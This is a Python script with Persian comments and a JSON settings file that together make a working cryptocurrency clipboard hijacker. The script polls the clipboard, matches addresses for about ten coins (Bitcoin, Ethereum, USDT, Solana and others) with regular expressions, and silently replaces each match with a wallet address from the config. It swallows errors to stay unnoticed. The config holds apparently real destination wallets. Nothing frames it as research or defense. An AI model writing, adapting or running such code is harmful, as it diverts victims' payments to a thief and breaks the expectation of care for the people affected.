import pyperclip, time, json, re
from datetime import datetime

# تنظیمات رو از فایل json بخون
with open("settings.json", "r") as f:
    settings = json.load(f)

address_map = settings["address_map"]
interval = settings.get("clipboard_check_interval", 1.5)

# الگوهای آدرس ارزها
patterns = {
    "BTC": r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}",
    "ETH": r"0x[a-fA-F0-9]{40}",
    "USDT": r"(T)[a-zA-HJ-NP-Z0-9]{33}",
    "DOGE": r"D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}",
    "XRP": r"r[0-9a-zA-Z]{24,34}",
    "ADA": r"addr1[0-9a-z]{50,}",
    "SOL": r"[1-9A-HJ-NP-Za-km-z]{32,44}",
    "LTC": r"(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{26,41}",
    "BNB": r"(bnb1)[a-z0-9]{38}",
    "USDT_MATIC": r"0x[a-fA-F0-9]{40}",
    "MATIC": r"0x[a-fA-F0-9]{40}",
    "USDT_ETH": r"0x[a-fA-F0-9]{40}"
}

previous = ""

while True:
    try:
        time.sleep(interval)
        current = pyperclip.paste()
        if current and current != previous:
            previous = current
            for coin, pattern in patterns.items():
                match = re.fullmatch(pattern, current)
                if match:
                    new_address = address_map.get(coin)
                    if new_address:
                        pyperclip.copy(new_address)
                        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        print(f"[{now}] {coin} address replaced.")
                        break
    except KeyboardInterrupt:
        break
    except Exception as e:
        pass
      {
  "clipboard_check_interval": 1.5,
  "address_map": {
    "BTC": "12bQP7qubLdcMBQ5RjRUYmAVWxuTSbMNrq",
    "ETH": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9",
    "USDT": "TEp8h5W97NZyKcN1556Cb5nq7moDevUit1",
    "DOGE": "DJwebawN3yYMUDQ6PdyGfurPTveu7nUjEG",
    "XRP": "rEeZbBwbmtKFjnmafpn1XTC1dYfmexUy1G",
    "ADA": "addr1q97eccpehpj8rtadcuj6tf66km8jpty8rfdmczvkvgawp5uz2tn0zncxwwyzd92zkmgjflzkpv4fw575p2wyv3sc4g0smx204y",
    "SOL": "BWLQCEvaqKH2PTp3kEhM3ts4bUG6JLT7y8L1vv16vE13",
    "LTC": "ltc1q6126xwpg2kfkrgesvtrq3rnukhnten069jcg6d",
    "BNB": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9",
    "USDT_MATIC": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9",
    "MATIC": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9",
    "USDT_ETH": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9"
  }
}
